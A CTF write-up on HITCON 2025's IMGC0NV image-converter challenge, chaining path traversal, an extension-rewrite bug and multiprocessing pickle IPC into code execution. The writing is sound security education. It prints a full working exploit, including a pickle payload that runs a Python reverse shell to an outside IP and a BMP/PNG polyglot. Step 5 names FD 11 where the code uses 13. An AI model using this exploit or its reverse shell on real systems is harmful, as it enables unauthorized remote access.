+++
title = "HITCON 2025 – IMGC0NV"
summary = "A writeup about exploiting an image converter service through path traversal and multiprocessing pickle deserialization. The solution required crafting a polyglot file that's both a valid BMP image and a malicious pickle payload to achieve RCE."
author = "Emanuel Mairoll"
date= "2025-08-29"
tags = ['Writeup', 'CTF', 'HITCON 2025', 'Web Security', 'Python', 'Pickle', 'Polyglot']
showTableOfContents = true
+++

Last weekend I competed in HITCON CTF 2025 together with the 0rganizers. I spent most of my time on the IMGC0NV web challenge, which looked deceptively simple at first - just abusing a trivial path traversal - but it unfolded into a cursed polyglot trick to land remote code execution through OS pipes. 

## Challenge Overview

IMGC0NV is a very simple bulk image converter: a website where you upload a bunch of images, pick an output format, and get back a zip with the converted images. It’s implemented in Flask and uses the popular Pillow library for image decoding and re-encoding. Images are converted concurrently in a threadpool, so multiple files are processed in parallel. We were handed the full source code and Docker image to replicate the environment exactly. The objective is to obtain a shell as the webserver user in order to run the `/readflag` command.

## Easiest shell ever? The very obvious path traversal

At first glance this is the easiest bug on earth. Uploaded images are written to a temp directory, and the server builds the destination path from the **user-controlled filename** plus the chosen output format. There is a sanitizer - but it’s broken in a wonderfully fatal way:

```python
def safe_filename(filename):
    filneame = filename.replace("/", "_").replace("..", "_")
    #  ^
    # TYPO HERE
    return filename  # returns the original, unsanitized name
```

The output name and path are then constructed from that "sanitized" value and the requested format:

```python
def convert_image(args):
    file_data, filename, output_format, temp_dir = args
    try:
        with Image.open(io.BytesIO(file_data)) as img:
            if img.mode != "RGB":
                img = img.convert('RGB')

            filename = safe_filename(filename)
            orig_ext = filename.rsplit('.', 1)[1] if '.' in filename else None

            ext = output_format.lower()
            if orig_ext:
                out_name = filename.replace(orig_ext, ext, 1)
            else:
                out_name = f"{filename}.{ext}"

            output_path = os.path.join(temp_dir, out_name)

            with open(output_path, 'wb') as f:
                img.save(f, format=output_format)

            return output_path, out_name, None
    except Exception as e:
        return None, filename, str(e)
```

Because `safe_filename` hands our input back untouched, classic `../` traversal works immediately. Even better, any absolute path wins outright: in Python, `os.path.join(base, "/absolute/target") == "/absolute/target"`, so an absolute component to the right discards the base entirely. In other words, if we supply an absolute path as the filename, the write will land exactly there, not in the temp directory.

The app code is under `/app`, so the first instinct is "just overwrite something in-place and pop a shell." 

But there is a catch: the webserver runs as `nobody`, meaning no write perms to `/app`, `/etc`, or most of the filesystem one could use to get RCE. So... not the easiest shell ever.

## Constraints & limitations

First, let's summarize the constraints we have to work with:

* **The upload must be a valid image and is re-encoded**: The server never writes your raw upload. It first opens the file with Pillow (`Image.open(...)`) and only if decoding succeeds does it save the image **re-encoded** using the requested format (`img.save(..., format=output_format)`). That means you cannot send arbitrary bytes - your payload has to be a Pillow-parsable image, and whatever funky header magic you may send will be normalized away by Pillow's encoder.

* **Forced file extension**: Filenames get rewritten so the extension matches the selected format. Concretely:
   ```python
   orig_ext = filename.rsplit('.', 1)[1] if '.' in filename else None
   ext = output_format.lower()
   if orig_ext:
       out_name = filename.replace(orig_ext, ext, 1)
   else:
       out_name = f"{filename}.{ext}"
   ```
   If your supplied name has a dot anywhere, whatever is after the last dot is treated as the original extension and a `replace` is applied across the whole string; if there’s no dot, `.<fmt>` is appended. This makes writing to a precise location fiddly.

* **Tight size cap (5 MB)**: The app enforces `MAX_CONTENT_LENGTH = 5 * 1024 * 1024`, so each request is limited to 5 MB. That doesn't sound like a huge issue at first, but will become relevant later.

* **Running as `nobody`**: With `USER nobody`, most "obvious" targets are off-limits. A quick `find / -writable 2>/dev/null` shows that, in practice, the only writeable targets are various temp and lock directories. But of course: We can also aim writes at our own `/proc/self/*`. *Thats a surprise tool we will use later*.


### Red herrings (LLM bait)

It's also noteworthy that a few bits look like they were explicitly put there there to steer LLMs down the wrong path. The source ends with:

```python
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5001)
```

But the container actually runs **gunicorn** with `app:app`, so that block never executes and **debug mode is not enabled** in the challenge environment. However, this doesn't stop ChatGPT from happily reporting that it found this critical misconfiguration. Furthermore, the fact that the service starts a new `multiprocessing.Pool` with every new request is a logic issue that LLMs also quickly point out as potential DDOS vector - which is of course absolutely irrelevant for getting RCE.

These cues are easy for automated helpers (and therefore their users) to latch onto and waste time on, and in the time where everybody uses LLMs for everything (including writing parts of this writeup lol) I find them to be a funny add-on by the challenge authors.

## Abusing the multiprocessing pool IPC

Since we have a very constrained "arbitrary write" primitive, the immediate question is: *Where can a write actually influence program behavior?* Temp and lock directories are quite uninteresting, but `/proc/self`... maybe.

Since the service parallelizes work with `multiprocessing`, an interesting thought is to see how workers actually talk to the parent. Digging through the standard library shows that `multiprocessing.Pool` is using queues which are built on top of **OS pipes**:

```python
class Pool(object):
    def __init__(self, processes=None, initializer=None, initargs=(),
                 maxtasksperchild=None, context=None):
        self._pool = []
        self._state = INIT
    ...
        self._inqueue = self._ctx.SimpleQueue()
        self._outqueue = self._ctx.SimpleQueue()
        self._quick_put = self._inqueue._writer.send
        self._quick_get = self._outqueue._reader.recv
    ...
        self._taskqueue = queue.SimpleQueue()
        self._change_notifier = self._ctx.SimpleQueue()
    ...

class SimpleQueue(object):
    def __init__(self, *, ctx):
        self._reader, self._writer = connection.Pipe(duplex=False)
    ...

def Pipe(duplex=True):
    ...
        fd1, fd2 = os.pipe()
        c1 = Connection(fd1, writable=False)
        c2 = Connection(fd2, readable=False)
    return c1, c2
```

Importantly (I don't really know why, it's kind of a bad idea imo), the payloads going over those pipes are **Python pickles**, and the receiver **unpickles them verbatim**:

```python
    def recv(self):
        self._check_closed()
        self._check_readable()
        buf = self._recv_bytes() # receive <len> bytes
        getbuf = buf.getbuffer()
        x = _ForkingPickler.loads(getbuf) # just blindly unpickles whatever it gets
        return x
```

One important wire-format detail: `multiprocessing` **prepends a big-endian I32 length** to each pickle payload. The receiver reads that length and then waits until at least that many bytes arrive before handing the buffer to the unpickler.

If one now actually finds the pipe that is used to pass data across the process boundary - i.e., the FD the parent uses to receive picklable objects - then the worker can just write a prepared object to `proc/self/fd/<FD>` to send it straight to the parent process and get remote code execution there. Reviewing the code in more detail shows it's always the **second pipe** open in the worker - file descriptor 6 in the "undisturbed" setup. In the challenge environment, which spawns a few more pipes (including the TCP socket), it ends up being FD 13.

Coding up a quick Python demo shows: Yes, this actually works. We have our attack vector.

```python
class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,("touch /tmp/pwned",))

## encode as multiprocessing expects it
body = ForkingPickler.dumps((0, 0, (True, [PickleRCE()])))
n = len(body)
header = struct.pack("!i", n)
payload = bytearray(header + body)

# this is called for the child (stripped down from app.py)
def send_to_parent_pipe(args):
    with open(f'/proc/self/fd/6', 'wb') as f:
        f.write(payload)

# send the task over to the worker
pool = Pool(processes=1)    
pool.map(send_to_parent_pipe, [('some arg')])
```

## fd/6.jpg ?

Although we now know that writing to the FD works, we're still constrained by the forced filename extension: We obviously can’t write to .../fd/6.jpg. 

But re-reading the code reveals another, more subtile logic bug: The app treats **everything after the last dot** as the "original extension" (`orig_ext = filename.rsplit('.', 1)[1]`), but then does a **global string replace** on the whole filename (`filename.replace(orig_ext, ext, 1)`), effectively replacing only the first occurrence of that substring anywhere in the path.
That means if the "extension" substring appears twice in the path, only the first occurrence is rewritten, leaving the second (the actual target) intact.


```python
filename = "//tmp/pwned/../tmp/pwned" # last dot is in "../"
ext = "jpg"
orig_ext = filename.rsplit('.', 1)[1]
-> "/tmp/pwned"

out_name = filename.replace(orig_ext, ext, 1)
-> "/jpg/../tmp/pwned"
```

However, another gotcha: The intermediate path segment created by replacing the first occurrence (e.g., the `/jpg` folder here) must be an existing directory in the filesystem - otherwise open() fails even if you later `..`-traverse back out.

So, to use this, we have to use an extension which is both 1) a valid, saveable Pillow format, and 2) the substring of a directory that actually exists somewhere on the system. Running `find / -type d -iname "*$ext*"` for all formats that Pillow can write narrows the viable candidates down to:

```bash
BMP: /usr/share/doc/libmpc3/
ICO: /usr/local/lib/python3.13/idlelib/Icons/
IM:  /etc/security/limits.d/
MPO: /usr/local/lib/python3.13/importlib/
SGI: /usr/local/lib/python3.13/wsgiref/
```

## Polyglot time

Now lets put it all together: Crafting a polyglot that is both a valid image (so Pillow accepts and re-encodes it) and a valid multiprocessing message (a length-preceeded python pickle), so the worker can write it into the file descriptor backing the `outqueue`, archieving RCE in the parent upon unpickling.

### Constraints recap

We need a file that is:

* a valid BMP, ICO, IM, MPO, or SGI (those map to existing dirs from the earlier "extension rewrite" trick),
* whose first 4 bytes (as big-endian I32) form a manageable length for `_recv_bytes` (the receiver waits until that many bytes arrive),
* survives Pillow re-encoding (decoded on upload, then saved in the chosen format),
* with the 5th byte already a valid Python pickle opcode (at least 0x28),
* while the request must stay < 5 MB total.

In the end, this took us more then a day to make all the header games work out. A few honorable mentions while iterating:

* ICO: Tried the longest, but the 5th byte encodes the number of images in the file, and Pillow encodes at most 7, which is too small for our purposes.
* CUR: A variant of ICO without the above restriction, there we were actually able to produce a POC, but CUR isn't writable by Pillow anyways.
* SGI: Very promising (starts of with `00 00 01 00`, but the 5th byte is constrained to {0,1,2}, none of which are valid pickle opcodes.
* TGA would have been perfect (very flexible header, also persisting after re-encoding), but there is no matching directory in the base image, and we couldn't find any other bypass for the path traversal restriction.

So, after a lot of trial and error, we finally settled on BMP. The header starts of with `BM` followed by the little-endian encoded file size in bytes. The latter is very convenient, because we can freely tune the size of the image to get the desired value at byte 5. The first two bytes however are a problem, since they correspond to a **gigantic** length prefix of around about 1GB - more on that in a bit.

### The Pickle Payload

Since we can basically freely control bytes 5 and 6, we have two bytes of pickle opcodes to work with. With modern versions of the pickle protocol, they start with `0x80` to denote pickle format and then `0x05` for protocol version 5, followed by framing which requires 1+8 more bytes. This would mean wrestling with other BMP header fields which gets messy fast.

Instead, we use protocol version 1 of pickle, which allows us to directly start with valid opcodes. Looking through the opcode table in `pickle.py` in the standard library, we find the convenient `V` opcode (0x56) - "push newline-terminated unicode string to stack". This lets the pickle VM effectively skip over all the remaining BMP header bytes until it encounters a newline (0x0a). 

We place the actual RCE payload (after said newline) somewhere in the image body, which for a lossless format like BMP is far less susceptible to byte changes than the header. The payload itself is just the classic depickling RCE pattern encoded with `Pickler.dumps(version=1)`, executing a Python reverse shell that connects back to our listener.

### Size Restrictions

We face two contradictory size constraints:
* The first 4 bytes `BM??` decode as a ~1GB length prefix from the pickle perspective
* The request is hard-capped at 5MB total

The solution uses Pillow's re-encoding to our advantage. While Pillow writes **uncompressed** BMPs (easily hundreds of MB for large images), we can upload the same image as a **PNG**. PNG's lossless compression reduces mostly-empty images to tiny blobs - what would be a 200+ MB BMP becomes a ~200 KB PNG. A quick experiment confirms, converting PNG -> BMP -> PNG through Pillow produces the exact same bytes, preserving our payload, so we can use this.

By then sending this file multiple times in one request, the pool writes each converted image sequentially to the same out-pipe. Concatenating multiple >200 MB BMP writes easily exceeds the 1 GB length advertised by the first four bytes, satisfying `_recv_bytes` so it finally hands control to the unpickler.

### Final polyglot:

This is the final polyglot:

![compressed](compressed.png)

In the lower left corner, you can actually see the Pickle payload when zooming in.

![payload](payload.png)


## Final exploit

```python
import requests
import io
from PIL import Image
from multiprocessing.reduction import ForkingPickler

# create large black image
img = Image.new('RGB', (20000, 3450)) # gives 0x56 at 5th byte
img_bytes = io.BytesIO()
img.save(img_bytes, format='BMP')
img_data = img_bytes.getvalue()

# python reverse shell in pickle RCE
command = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("12.34.56.78",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))
pickle = ForkingPickler.dumps((0, 0, (True, [PickleRCE()])), protocol=1)

# insert newline and payload
polyglot = img_data[:100] + b'\n0' + pickle + img_data[100+len(pickle)+2:]

# convert to png
payload = io.BytesIO()
Image.open(io.BytesIO(polyglot)).save(payload, format="PNG")

# send to challenge server
url = "http://imgc0nv.chal.hitconctf.com:12345/convert"
repl = "/proc/self/fd/13" 
# abusing the /usr/share/doc/libmpc3 directory
remote_filename = f"/usr/share/doc/li{repl}c3/../../../../..{repl}"
fmt = "bmp"
files = [("files", (remote_filename, payload)) for _ in range(6)]
requests.post(url, data={"format": fmt}, files=files)
```

Here's what happens when the exploit runs:

1. **Polyglot Construction**: We create a 20000x3450 RGB image, specifically sized so the BMP file size lands us with byte 5 = 0x56 (the `V` pickle opcode). This black image starts as a ~207MB BMP.

2. **Pickle Injection**: The RCE payload gets injected 100 bytes into the BMP data, right after a newline character and a `0` pop opcode. The `V` opcode tells pickle to read until the next newline, effectively skipping the rest of the BMP header. We use pickle protocol 1 to avoid the overhead of modern framing.

3. **PNG Compression**: The polyglot BMP is converted to PNG, shrinking from 207MB to ~201KB through lossless compression. This allows us to stay under the 5MB request limit while still producing huge BMPs server-side.

4. **Path Manipulation**: The filename `/usr/share/doc/lib/proc/self/fd/13c3/../../../../../proc/self/fd/13` exploits the extension replacement bug. When the server replaces the first `/proc/self/fd/13` with `bmp`, it creates `/usr/share/doc/libbmpc3/...` which traverses back to the actual target `/proc/self/fd/13`. 

5. **Multiple Uploads**: We send 6 copies of the same file in one request. Each gets decoded from PNG and re-encoded as a 207MB BMP by Pillow, then written sequentially to FD 11 (the multiprocessing outqueue pipe in the challenge setup).

6. **Size Overflow**: The first 4 bytes `BM??` tell the pickle receiver to expect ~1GB of data. Six 207MB files = 1.2GB total, which finally satisfies `_recv_bytes` and triggers unpickling.

7. **RCE Execution**: The pickle machinery in the parent process deserializes our `PickleRCE` object, which calls `os.system()` with our command, giving us a reverse shell as the `nobody` user.

Flag: `hitcon{i hope both sides of your Pillow are cold :)}`

## Final Remarks

The beauty of this challenge is how it chains together multiple subtle bugs - a trivial path traversal, a logic error in extension handling, and the cursed knowledge about the absurd design choice of using pickles for IPC - into a complex but satisfying exploit. The polyglot construction requiring both valid image headers and pickle opcodes while juggling size constraints makes this one of the more creative web challenges we've seen.

